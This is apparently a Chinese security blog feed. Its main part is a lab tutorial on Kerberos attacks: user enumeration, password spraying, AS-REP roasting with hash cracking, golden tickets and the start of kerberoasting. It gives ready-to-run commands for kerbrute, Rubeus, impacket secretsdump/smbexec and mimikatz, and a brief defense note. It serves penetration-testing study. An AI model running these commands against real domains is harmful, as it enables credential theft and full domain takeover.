<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> +<span class="hljs-keyword">x</span> <span class="hljs-keyword">exp</span><br><span class="hljs-keyword">chmod</span> +<span class="hljs-keyword">x</span> ofs-lib.so<br>./<span class="hljs-keyword">exp</span><br></code></pre></td></tr></table></figure>



<p>发现失败</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221006163655486.png"  ><span class="image-caption">image-20221006163655486</span></p>
<p>需要将两个文件移动到tmp文件夹下才行</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cp</span> <span class="hljs-built_in">exp</span> ofs-lib.<span class="hljs-keyword">so</span> /tmp<br></code></pre></td></tr></table></figure>

<p>执行发现成功</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>靶场</tag>
        <tag>docker容器</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos攻击</title>
    <url>/2023/03/04/Kerberos%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="Kerberos认证基础"><a href="#Kerberos认证基础" class="headerlink" title="Kerberos认证基础"></a>Kerberos认证基础</h1><p><font color='red'>kerberos认证协议是基于票据的认证方式</font></p>
<p>kerberos分为三部分：用户、服务器、KDC（Key Distribution Center）</p>
<p>KDC包含：AS（Authentication Server）、TGS（Ticket Granting Server）</p>
<h2 id="kerberos基础认证流程"><a href="#kerberos基础认证流程" class="headerlink" title="kerberos基础认证流程"></a>kerberos基础认证流程</h2><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/91C85F3DF584F41878C343B204E1DEC2.png"  ><span class="image-caption">91C85F3DF584F41878C343B204E1DEC2</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/aaa.png"  ><span class="image-caption">aaa</span></p>
<p>kerberos认证，其实就是类似于参观一个实验室，普通人只能参观展品、高级访客可以进入内部参观</p>
<p>前提是你得提前预约获得一个密码，成为高级访客</p>
<p>你进实验室时，在门禁处输入你的账号密码，AS验证是否正确，然后返回你一个临时参观证，临时参观证由你的信息和访问权限组成，并且用krbtgt加密</p>
<p>比如你现在想要参观实验室里面的武器库（你要访问的服务）</p>
<p>你到申请处（TGS）进行申请，扫描参观证，输入你要参观的地方（server），申请处对你的参观证进行验证，成功之后，用武器库的密码加密，得到一个门禁卡（TGS票据）</p>
<p>到达武器库，扫描门禁卡，进行访问</p>
<p>这里面是有漏洞的</p>
<p>1.如果krbtgt密码被知道，就可以任意伪造参观证</p>
<p>2.如果武器库密码泄露，是不是就是任何人可以访问，前提是武器库没有设置PAC（即返回KDC确认）</p>
<h2 id="kerberos攻击分类"><a href="#kerberos攻击分类" class="headerlink" title="kerberos攻击分类"></a>kerberos攻击分类</h2><p>上面分析可知，kerberos一般就在AS阶段、TGS阶段、PAC</p>
<p>AS阶段</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">域内用户枚举<br>密码喷洒<br>AS_REP Roasting<br>黄金票据<br></code></pre></td></tr></table></figure>



<p>TGS阶段</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">kerberosast攻击<br>白银票据<br>委派攻击<br></code></pre></td></tr></table></figure>



<p>PAC</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">42278</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">42287</span><br></code></pre></td></tr></table></figure>







<h1 id="AS阶段攻击"><a href="#AS阶段攻击" class="headerlink" title="AS阶段攻击"></a>AS阶段攻击</h1><h2 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h2><p>在没有域内任何的凭据的前提下，枚举出域内用户名</p>
<p>当我们不在域内，但是发现了一个域，此时就可以考虑先枚举出域内用户，然后再进行密码喷洒攻击</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理是用到kerberos协议的AS_REQ</p>
<p>当域内用户的状态不同时，AS_REP包返回的数据是不同的</p>
<p>AS_REQ包里面的cname的值就是用户名字</p>
<p>用户的不同状态对应的AS_REP返回包</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><code class="hljs fortran">用户存在并且启用		KDC_ERR_PREAUTH_REQUIRED<br><br>用户存在但是禁用		KDC_ERR_CLIENT_REVOKED NT <span class="hljs-keyword">Status</span>: STATUS_ACCOUNT_DISABLED<br><br>用户不存在			   KDC_ERR_C_PRINCIPAL_UNKNOWN<br></code></pre></td></tr></table></figure>

<p>通过不同的返回包，就能确定某个账户是否存在</p>
<h3 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h3><p><font color='red'>前提是有一台能够与域控通信的计算机，不管登陆账户是否为域用户，只要能和域控通信就行</font></p>
<h4 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h4><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span>语言编写的用于<br>用户名枚举、密码喷洒的工具<br></code></pre></td></tr></table></figure>



<p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ropnop/</span>kerbrute<br></code></pre></td></tr></table></figure>



<p>前提</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">域内主机，但是用非域内账号登陆<br><br>非域内主机，但是能够和域控通信<br><br>总的来说，就是一台能够与域控通信的计算机就行<br><br>其次，下载时windows检测到病毒，需要做免杀<br></code></pre></td></tr></table></figure>



<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum <span class="hljs-attr">--dc</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span><br><br><span class="hljs-selector-id">#userenum</span>:枚举模式<br>#<span class="hljs-attr">--dc</span>：域控ip<br>#-d：域名<br><span class="hljs-selector-id">#user</span><span class="hljs-selector-class">.txt</span>:用户名字典，不需要加域名后缀<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230212224329512.png"  ><span class="image-caption">image-20230212224329512</span></p>
<h4 id="pykerbrute"><a href="#pykerbrute" class="headerlink" title="pykerbrute"></a>pykerbrute</h4><figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel">更kerbrute功能一样<br>但是是用<span class="hljs-keyword">python</span>语言编写<br>有tcp和udp两种工作模式<br><br>不需要做免杀，只是一个<span class="hljs-keyword">python</span>脚本<br></code></pre></td></tr></table></figure>



<p>用法</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#TCP模式</span><br>python2 EnumADUser.py <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span> <span class="hljs-keyword">user</span>.txt udp<br><br><span class="hljs-meta">#UDP模式</span><br>python2 EnumADUser.py <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span> <span class="hljs-keyword">user</span>.txt tcp<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230212231057818.png"  ><span class="image-caption">image-20230212231057818</span></p>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>作为一个很牛逼的工具msf，它也有用户枚举的功能</p>
<p>在</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/gather/</span>kerberos_enumusers<br></code></pre></td></tr></table></figure>



<p>使用命令</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams">use auxiliary/gather/kerberos_enumusers<br><span class="hljs-keyword">set</span> domain <span class="hljs-comment">sayms.local</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.8.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">user_file user.txt</span><br>run<br></code></pre></td></tr></table></figure>

<p>大同小异，都是需要知道域名、ip、还有用户名字典</p>
<h3 id="枚举抓包分析"><a href="#枚举抓包分析" class="headerlink" title="枚举抓包分析"></a>枚举抓包分析</h3><p>我们开始之前，先用wireshark捕获192.168.8.2这个本地连接的数据包</p>
<p>然后运行工具</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093328742.png"  ><span class="image-caption">image-20230213093328742</span></p>
<p>捕获的数据包</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093454761.png"  ><span class="image-caption">image-20230213093454761</span></p>
<p>可以看到返回的结果</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093534288.png"  ><span class="image-caption">image-20230213093534288</span></p>
<p>根据这个判断域内用户是否存在</p>
<p>看一个成功的数据包</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213093733082.png"  ><span class="image-caption">image-20230213093733082</span></p>
<p>说明tony这个用户就是域用户</p>
<h2 id="域内密码喷洒"><a href="#域内密码喷洒" class="headerlink" title="域内密码喷洒"></a>域内密码喷洒</h2><p>普通的密码爆破是用固定的用户名然后去爆破密码，但是这样账户登陆可能容易被锁定</p>
<p>密码喷洒，是用固定的密码，去爆破用户名</p>
<p>简而言之，就是一个密码，域内哪些用户用这个密码</p>
<p>因为域管理员为了方便记忆管理，一些用户的密码，可能会设置一样</p>
<p>当然前提是你得先域内用户枚举，找到域内存在哪些用户</p>
<h3 id="密码锁定策略"><a href="#密码锁定策略" class="headerlink" title="密码锁定策略"></a>密码锁定策略</h3><p>刚才说了，直接爆破密码，很容易导致账户锁定</p>
<p>只有没开启密码锁定策略，就可以爆破</p>
<p>通过powershell的命令，可以查询密码锁定策略</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ADDefaultDomainPasswordPolicy</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213114120853.png"  ><span class="image-caption">image-20230213114120853</span></p>
<p>默认是0，就是没有设置次数锁定，可以进行爆破</p>
<p>一般默认是没有开启的，可以爆破</p>
<h3 id="工具喷洒"><a href="#工具喷洒" class="headerlink" title="工具喷洒"></a>工具喷洒</h3><h4 id="kerbrute-1"><a href="#kerbrute-1" class="headerlink" title="kerbrute"></a>kerbrute</h4><p>kerbrute不仅可以用户枚举还可以密码喷洒</p>
<p>密码喷洒</p>
<p>用法</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><code class="hljs nsis">kerbrute_windows_amd64.exe passwordspray --dc <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms.local <span class="hljs-literal">user</span>.txt <span class="hljs-literal">admin</span>!@<span class="hljs-comment">#45</span><br><br><span class="hljs-comment">#passwordspray：密码喷洒模式</span><br><span class="hljs-comment">#--dc：域控ip</span><br><span class="hljs-comment">#-d：域名</span><br><span class="hljs-comment">#user.txt：域内用户</span><br><span class="hljs-comment">#123456：密码</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213112929229.png"  ><span class="image-caption">image-20230213112929229</span></p>
<p>当然如果域内没有设置账户锁定，直接爆破密码当然是更方便的</p>
<p>密码爆破</p>
<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> bruteuser <span class="hljs-attr">--dc</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> -d sayms<span class="hljs-selector-class">.local</span> passwords<span class="hljs-selector-class">.txt</span> administrator<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213113426449.png"  ><span class="image-caption">image-20230213113426449</span></p>
<h4 id="pykerbrute-1"><a href="#pykerbrute-1" class="headerlink" title="pykerbrute"></a>pykerbrute</h4><p>和kerbrute差不多，不同的是</p>
<p><font color='red'>pykerbrute使用密码喷洒，可以是明文密码也可以是hash值</font></p>
<p>用法</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#明文喷洒<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> clearpassword <span class="hljs-number">123456</span> tcp<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> clearpassword <span class="hljs-number">123456</span> udp<br><br>#hash密码喷洒<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> ntlmhsh 哈希值 tcp<br>python2 ADPwdSpray<span class="hljs-selector-class">.py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">8.1</span> sayms<span class="hljs-selector-class">.local</span> user<span class="hljs-selector-class">.txt</span> ntlmhsh 哈希值 udp<br></code></pre></td></tr></table></figure>





<h4 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h4><p>改脚本需要在域内计算机上使用powershell运行</p>
<p><font color='red'>powershell4.0的版本中该脚本不能执行</font></p>
<p><font color='red'>该脚本必须是域用户登陆的计算机执行，才能成功</font></p>
<p>因为该脚本是利用LDAP从域中导出用户列表，然后去除被锁定账户，再进行密码喷洒</p>
<p>用法</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq">powershell -exec bypass<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span>. \DomainPasswordSpray.ps1<br>Invoke-DomainPasswordSpray -Password <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213122805639.png"  ><span class="image-caption">image-20230213122805639</span></p>
<h3 id="密码喷洒数据包分析"><a href="#密码喷洒数据包分析" class="headerlink" title="密码喷洒数据包分析"></a>密码喷洒数据包分析</h3><p>首先进行喷洒</p>
<p>抓取数据包</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213125247223.png"  ><span class="image-caption">image-20230213125247223</span></p>
<p>如上</p>
<p>只有这一组AS_REP数据包返回结果正常</p>
<p>证明喷洒成功一个</p>
<p>喷洒失败的数据包</p>
<p>回显示krb-error</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213125502950.png"  ><span class="image-caption">image-20230213125502950</span></p>
<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS_REP Roasting"></a>AS_REP Roasting</h2><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>一种对用户账户进行离线爆破的方式</p>
<p>需要被攻击的账号开启    “<font color='red'>不需要Kerberos预身份认证</font>”</p>
<p>但是</p>
<p>这个选项默认不开启</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213180646969.png"  ><span class="image-caption">image-20230213180646969</span></p>
<p>“不需要Kerberos预身份认证”的主要作用就是    防止密码离线爆破</p>
<p>关闭之后</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">攻击者使用指定账户向域控的kerberos <span class="hljs-number">88</span>端口发送数据包<br><br>此时域控不会进行验证<br><br>直接返回TGT和用改用户hash加密的<span class="hljs-keyword">Login</span> <span class="hljs-keyword">session</span> key<br></code></pre></td></tr></table></figure>



<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>攻击过程总的来说分两步</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">获取<span class="hljs-built_in">hash</span>加密的Login session key<br><br>解密<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>



<p>当然首要的还是找到    设置了“不需要Kerberos预身份认证”的用户</p>
<p>还需要能和Kerberos 88端口通信的主机</p>
<h3 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h3><p>我们需要的hash在</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><code class="hljs dart">AS_REP响应包最外层的ecp-<span class="hljs-keyword">part</span>的cipher部分<br></code></pre></td></tr></table></figure>



<h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>该工具比较人性</p>
<p>它会自动筛选找到域中设置了“不需要Kerberos预身份认证”的用户</p>
<p>然后以改用户的身份发送AS_REQ包</p>
<p>最后将返回的hash加密的Login session key，以<font color='red'>John那个解密的格式放在hash.txt文件中</font></p>
<p>简而言之就是，自动筛选、自动发送、自动转换、自动保存</p>
<p>注意</p>
<p><font color='red'>必须是用域账户登陆的主机才行，本地账户登陆的域主机是无法成功的</font></p>
<p>用法</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">Rubeus.exe asreproast <span class="hljs-regexp">/format:john /</span>outfile:hash.txt<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213191034323.png"  ><span class="image-caption">image-20230213191034323</span></p>
<h4 id="ASREPRoast-ps1脚本"><a href="#ASREPRoast-ps1脚本" class="headerlink" title="ASREPRoast.ps1脚本"></a>ASREPRoast.ps1脚本</h4><p>功能作用和rubeus一样</p>
<p>不同的是它没有自动过滤出hash，需要用命令导出</p>
<p>注意</p>
<p><font color='red'>必须是用域账户登陆的主机才行，本地账户登陆的域主机是无法成功的</font></p>
<p>用法</p>
<figure class="highlight monkey"><table><tr><td class="code"><pre><code class="hljs monkey"><span class="hljs-meta">#用cmd打开powershell</span><br>powershell -exec bypass<span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#命令</span><br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\ASREPRoast.ps1<br><br>Invoke-ASREPRoast | <span class="hljs-keyword">select</span> -ExpandProperty Hash<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213202229163.png"  ><span class="image-caption">image-20230213202229163</span></p>
<h4 id="非域内机器"><a href="#非域内机器" class="headerlink" title="非域内机器"></a>非域内机器</h4><p>上面两个方法，都是基于有一个域内的主机进行测试的，如果我知道了域内的一个账号密码，但是没有域主机，咋办</p>
<p>下面就提出了解决办法</p>
<p>前提</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拥有一个域内账号密码<br></code></pre></td></tr></table></figure>



<p>思路</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">首先利用Adfind，过滤出	“不需要Kerberos预身份认证”的账户<br><br>然后用impacket包里面的工具GetNPUsers.py进行获取<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">adfind -h <span class="hljs-number">192.168.8.1</span>:<span class="hljs-number">389</span> -u sayms\aim -up admin@<span class="hljs-number">123</span> -f &quot;useraccountcontrol:<span class="hljs-number">1.2.840</span>.<span class="hljs-number">113556.1.4</span>.<span class="hljs-number">803</span>:=<span class="hljs-number">4194304</span>&quot; -dn<br></code></pre></td></tr></table></figure>



<p>然后将获取到的用户，写入user.txt文件</p>
<p>执行</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">python3 GetNPUsers.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> -usersfile <span class="hljs-keyword">user</span>.txt -<span class="hljs-keyword">format</span> john sayms.<span class="hljs-keyword">local</span>/<br></code></pre></td></tr></table></figure>

<p>但是失败了</p>
<p>可能是88端口，不对外开放</p>
<p>也可以直接使用impacket包里面的工具GetNPUsers.py进行爆破，前提是你的用户名字典足够厉害</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><code class="hljs fortran">python3 GetNPUsers.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> -userfile users.txt -<span class="hljs-keyword">format</span> john sayms.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>







<h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><h4 id="john"><a href="#john" class="headerlink" title="john"></a>john</h4><p>对字典要求比价大，字典内容为明文密码，不需要为hash</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john --wordlist=<span class="hljs-regexp">/opt/</span>psaawords.txt <span class="hljs-built_in">hash</span>.txt<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213213852501.png"  ><span class="image-caption">image-20230213213852501</span></p>
<p>成功</p>
<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>因为上面的测试，保存的hash值都是john模式</p>
<p>此时hashcat是无法破译的</p>
<p>需要加上$23</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213214201116.png"  ><span class="image-caption">image-20230213214201116</span></p>
<p>然后进行破译</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">18200</span> hash<span class="hljs-selector-class">.txt</span> passwords<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230213214542657.png"  ><span class="image-caption">image-20230213214542657</span></p>
<h3 id="AS-REP-Roasting防御"><a href="#AS-REP-Roasting防御" class="headerlink" title="AS_REP Roasting防御"></a>AS_REP Roasting防御</h3><p>1.取消    “不需要Kerberos预身份认证”</p>
<p>2.日志层面，关注事件ID为4768，预身份认证为0的日志</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>获得域内账户krbtgt的密钥值</p>
<p>想要拿到krbtgt账户的密钥值，一般想要高权限用户，所以黄金票据攻击一般用于权限维持</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>发生在AS_REP阶段，在进过预认证之后，KDC返回的TGT的authorization-data是krbtgt的密钥加密的</p>
<p>authorization-data中存放的PAC里面的重要部分也是krbtgt密钥加密的</p>
<p>PAC主要是存放用户的身份信息，PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM是PAC的重要部分</p>
<p>所以我们<font color='red'>拿到krbtgt的密钥之后，就可以伪造高权限PAC，放到TGT中，然后用这个高权限，来请求服务票据</font></p>
<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>伪造TGT是不需要连接KDC的，整个过程是离线的</p>
<p>创建黄金票据需要的信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">krbtgt的密钥值<br>域名<br>域SID<br>伪造的高权限域用户的用户名<br></code></pre></td></tr></table></figure>

<p>一般需要在域控上面查询</p>
<p>黄金票据攻击一般工具Impacket、mimikatz、CS</p>
<h3 id="利用Impacket攻击"><a href="#利用Impacket攻击" class="headerlink" title="利用Impacket攻击"></a>利用Impacket攻击</h3><p>思路</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">生成票据（ticketer.<span class="hljs-keyword">py</span>）<br><br>导入票据<br><br>导出hash（secretsdump.<span class="hljs-keyword">py</span>)<br><br>连接（smbexec.<span class="hljs-keyword">py</span>）<br></code></pre></td></tr></table></figure>



<p>生成黄金票据</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">python3 ticketer.py -<span class="hljs-built_in">domain</span>-sid sid值 -nthash 哈希值 -<span class="hljs-built_in">domain</span> 域名 域管账户名字<br></code></pre></td></tr></table></figure>







<p>导入票据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=域管账户名.ccache<br></code></pre></td></tr></table></figure>



<p>导出域管账户的hash</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass 域管账户@域控主机名.域名 -dc-ip 域控ip -just-dc-user 域管账户名<br></code></pre></td></tr></table></figure>



<p>远程连接</p>
<p>需要注意的是</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm">需要先在本地的hosts文件中添加要远程访问主机的<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure>

<p>远程连接域控</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> smbexec.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> 域管账户@域控主机名.域名 -dc-ip 域控ip<br></code></pre></td></tr></table></figure>



<p>远程连接其他主机</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> smbexec.py -<span class="hljs-literal">no</span>-pass -k 域管账户@其他主机名.域名 -dc-ip 域控ip -codec gbk      <span class="hljs-comment">#没有写错，就是域控的ip</span><br></code></pre></td></tr></table></figure>







<h3 id="利用mimikatz攻击"><a href="#利用mimikatz攻击" class="headerlink" title="利用mimikatz攻击"></a>利用mimikatz攻击</h3><p>mimikatz攻击可以使用域内机器，也可以是非域内机器</p>
<p>不在域内的机器，需要把其的DNS服务器设置为域控</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">dns</span> &quot;以太网&quot; <span class="hljs-symbol">static</span> 域控<span class="hljs-symbol">ip</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<p>首先尝试远程访问C盘</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217233131593.png"  ><span class="image-caption">image-20230217233131593</span></p>
<p>权限不够，拒绝访问</p>
<p>生成黄金票据，导入内存，就有高权限，来导出任意用户的hash</p>
<p><strong>注意：在生成黄金票据之前一定要先删除之前的所有票据，如果存在多个票据，系统不知道选用哪一个，会随机选取</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#删除所有票据</span><br><span class="hljs-attribute">klist</span> purge<br><br><span class="hljs-comment">#查看存在哪些票据</span><br>klist<br></code></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#导入golden</span><br><span class="hljs-attribute">kerberos</span>::golden /user:administrator /domain:sayms.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">199966615</span>-<span class="hljs-number">2708578713</span>-<span class="hljs-number">1277870648</span> /krbtgt:<span class="hljs-number">020</span>da1822e87dc4b9d87cf7891f3c7e8 /ptt<br></code></pre></td></tr></table></figure>

<p>导入成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230216122002809.png"  ><span class="image-caption">image-20230216122002809</span></p>
<p>远程访问C盘</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217233212497.png"  ><span class="image-caption">image-20230217233212497</span></p>
<p>成功</p>
<h3 id="利用CS攻击"><a href="#利用CS攻击" class="headerlink" title="利用CS攻击"></a>利用CS攻击</h3><p>CS工具就比较好用，窗口化，自动化</p>
<p>拿到session之后，就可以进行操作</p>
<p>选择黄金票据，然后填入需要的参数即可</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">用户名<br><br>域名<br><br>域SID<br><br>krbtgt的<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>

<p>然后就是一键完成攻击</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>黄金票据利用的是kerberos协议的缺陷，而不是漏洞，需要高权限的基础，才能完成黄金票据攻击</p>
<p>黄金票据主要是利用了AS和TGS之间的信任基础</p>
<h1 id="TGS阶段攻击"><a href="#TGS阶段攻击" class="headerlink" title="TGS阶段攻击"></a>TGS阶段攻击</h1><h2 id="kerberosasting攻击"><a href="#kerberosasting攻击" class="headerlink" title="kerberosasting攻击"></a>kerberosasting攻击</h2><p>主要用于域内权限提升</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在第四阶段，即TGS_REP</p>
<p>TGS服务端，返回客户端一个由服务的hash加密的ST</p>
<p>然后客户就可以拿到进行本地爆破</p>
<p><font color='red'>爆破得到一个有权限访问对应SPN的账户密码</font></p>
